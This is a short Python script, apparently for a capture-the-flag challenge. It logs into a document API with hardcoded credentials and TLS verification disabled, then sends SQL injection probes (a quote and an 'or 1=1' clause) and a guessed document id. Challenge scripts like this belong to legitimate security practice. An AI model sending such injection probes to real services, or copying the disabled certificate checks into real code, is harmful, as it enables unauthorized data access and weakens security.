import requests

session = requests.Session()
url_login = "https://ctf.marabit.xyz/api/auth/login"
data = {"email": "analyst@blackarchive.local", "password": "ArchiveAccess2026!"}
session.post(url_login, json=data, verify=False)

urls = [
    "https://ctf.marabit.xyz/api/documents/17'",
    "https://ctf.marabit.xyz/api/documents/17 or 1=1",
    "https://ctf.marabit.xyz/api/documents/70efdf2ec9b086079795c442636b55fb"
]
for u in urls:
    r = session.get(u, verify=False)
    print(u, r.status_code, r.text)
